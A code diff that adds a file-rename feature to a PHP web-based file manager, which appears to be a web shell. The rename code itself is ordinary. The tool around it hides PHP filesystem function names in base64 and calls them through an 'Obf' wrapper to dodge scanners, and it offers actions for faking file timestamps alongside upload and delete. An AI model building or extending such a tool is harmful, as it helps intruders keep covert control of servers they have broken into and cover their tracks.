@@ -6,6 +6,7 @@ class Obf {
         'file_put_contents' => 'ZmlsZV9wdXRfY29udGVudHM=',
         'unlink' => 'dW5saW5r',                       // unlink
         'rmdir' => 'cm1kaXI=',                        // rmdir
+        'rename' => 'cmVuYW1l',                       // rename
         'mkdir' => 'bWtkaXI=',                        // mkdir
         'touch' => 'dG91Y2g=',                        // touch
         'is_dir' => 'aXNfZGly',                       // is_dir
@@ -712,7 +713,7 @@ class Files {
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       $postedTimeTarget = (string)App::param('time_target', '', true);
       $postedTimeSource = (string)App::param('time_source', '', true);
-      $mutatingActions = ['mkdir', 'touch', 'batch_delete', 'delete', 'set_time_manual', 'set_time_copy', 'upload'];
+      $mutatingActions = ['mkdir', 'touch', 'batch_delete', 'delete', 'rename', 'set_time_manual', 'set_time_copy', 'upload'];
       if (in_array($action, $mutatingActions, true) && !App::checkCsrf()) {
         App::flash('Invalid token.', 'error');
         App::redirect('files', self::redirectParams($cwd, $postedTimeTarget, $postedTimeSource));
@@ -806,6 +807,25 @@ class Files {
           App::flash('Deleted.', 'success');
         } else {
           App::flash('Delete failed.', 'error');
+        }
+        App::redirect('files', self::redirectParams($cwd, $nextTimeTarget, $nextTimeSource));
+      }
+      if ($action === 'rename') {
+        $target = (string)App::param('target', '', true);
+        $newName = (string)App::param('new_name', '');
+        $nextTimeTarget = $postedTimeTarget;
+        $nextTimeSource = $postedTimeSource;
+        $renamedRel = $target !== '' ? self::renameItem($target, $newName) : false;
+        if ($renamedRel !== false) {
+          if ($target === $nextTimeTarget) {
+            $nextTimeTarget = $renamedRel;
+          }
+          if ($target === $nextTimeSource) {
+            $nextTimeSource = $renamedRel;
+          }
+          App::flash('Renamed.', 'success');
+        } else {
+          App::flash('Rename failed.', 'error');
         }
         App::redirect('files', self::redirectParams($cwd, $nextTimeTarget, $nextTimeSource));
       }
@@ -996,6 +1016,46 @@ class Files {
       return false;
     }
     return Obf::call('file_put_contents', $target, '') !== false;
+  }
+
+  public static function renameItem($rel, $newName) {
+    $rel = self::normalizePath($rel);
+    $newName = self::safeName($newName);
+    if ($rel === '' || $rel === '.' || $rel === '/' || $newName === '') {
+      return false;
+    }
+    $source = self::resolve($rel);
+    if ($source === false || !self::pathExists($source)) {
+      return false;
+    }
+    $parentRel = self::parentRel($rel);
+    if ($parentRel === false) {
+      return false;
+    }
+    if ($parentRel === '') {
+      $targetRel = $newName;
+    } elseif ($parentRel === '/') {
+      $targetRel = '/' . $newName;
+    } elseif (preg_match('/^[A-Za-z]:\/$/', $parentRel)) {
+      $targetRel = $parentRel . $newName;
+    } else {
+      $targetRel = self::joinPath($parentRel, $newName);
+    }
+    $target = self::resolve($targetRel);
+    if ($target === false || self::pathExists($target)) {
+      return false;
+    }
+    $sourceParent = str_replace('\\', '/', dirname($source));
+    $targetParent = str_replace('\\', '/', dirname($target));
+    if ($sourceParent !== $targetParent) {
+      return false;
+    }
+    if (!Obf::call('rename', $source, $target)) {
+      return false;
+    }
+    Obf::call('clearstatcache', true, $source);
+    Obf::call('clearstatcache', true, $target);
+    return self::rel($target);
   }
 
   public static function delete($rel) {
@@ -1190,6 +1250,25 @@ class Files {
       return $name;
     }
     return $base . '/' . $name;
+  }
+
+  private static function parentRel($rel) {
+    $rel = rtrim(self::normalizePath($rel), '/');
+    if ($rel === '' || $rel === '.' || $rel === '/' || preg_match('/^[A-Za-z]:$/', $rel)) {
+      return false;
+    }
+    $pos = strrpos($rel, '/');
+    if ($pos === false) {
+      return '';
+    }
+    if ($pos === 0) {
+      return '/';
+    }
+    $parent = substr($rel, 0, $pos);
+    if (preg_match('/^[A-Za-z]:$/', $parent)) {
+      $parent .= '/';
+    }
+    return $parent;
   }
 
   private static function isAbsolutePath($path) {
@@ -2359,7 +2438,14 @@ class UI {
               $isTimeSource = $timeSource && $item['rel'] === $timeSource['rel'];
               $rowClass = $isTimeTarget ? 'time-row-active' : ($isTimeSource ? 'time-row-source' : '');
               $timeParams = ['r' => 'files', 'p' => App::enc($cwd), 'time_target' => App::enc($item['rel'])];
+              $renameParams = ['r' => 'files', 'action' => 'rename', 'p' => App::enc($cwd), 'target' => App::enc($item['rel']), 'csrf' => $csrf];
               $sourceParams = ['r' => 'files', 'p' => App::enc($cwd)];
+              if ($timeTarget) {
+                $renameParams['time_target'] = App::enc($timeTarget['rel']);
+              }
+              if ($timeSource) {
+                $renameParams['time_source'] = App::enc($timeSource['rel']);
+              }
               if ($timeTarget) {
                 $sourceParams['time_target'] = App::enc($timeTarget['rel']);
                 $sourceParams['time_source'] = App::enc($item['rel']);
@@ -2411,6 +2497,11 @@ class UI {
                       <button type="submit" class="tag-button">Download</button>
                     </form>
                   <?php endif; ?>
+                  <form method="post" action="<?php echo App::h($selfPath); ?>" class="inline-post" data-current-name="<?php echo App::h($item['name']); ?>" onsubmit="return promptRename(this);">
+                    <?php echo App::hiddenInputs($renameParams); ?>
+                    <input type="hidden" name="new_name" value="">
+                    <button type="submit" class="tag-button">Rename</button>
+                  </form>
                   <form method="post" action="<?php echo App::h($selfPath); ?>" class="inline-post">
                     <?php echo App::hiddenInputs($timeParams); ?>
                     <button type="submit" class="tag-button">Time</button>
@@ -2444,6 +2535,27 @@ class UI {
       </table>
     </div>
     <script>
+      function promptRename(form) {
+        var currentName = form.getAttribute('data-current-name') || '';
+        var input = form.querySelector('input[name="new_name"]');
+        if (!input) {
+          return false;
+        }
+        var nextName = prompt('New name:', currentName);
+        if (nextName === null) {
+          return false;
+        }
+        nextName = nextName.trim();
+        if (nextName === '' || nextName === currentName) {
+          return false;
+        }
+        if (nextName.indexOf('/') !== -1 || nextName.indexOf('\\') !== -1) {
+          alert('Name cannot contain slashes.');
+          return false;
+        }
+        input.value = nextName;
+        return true;
+      }
       function getBatchDeleteCheckboxes() {
         return document.querySelectorAll('input[type="checkbox"][name="selected[]"][form="batch-delete-form"]');
       }
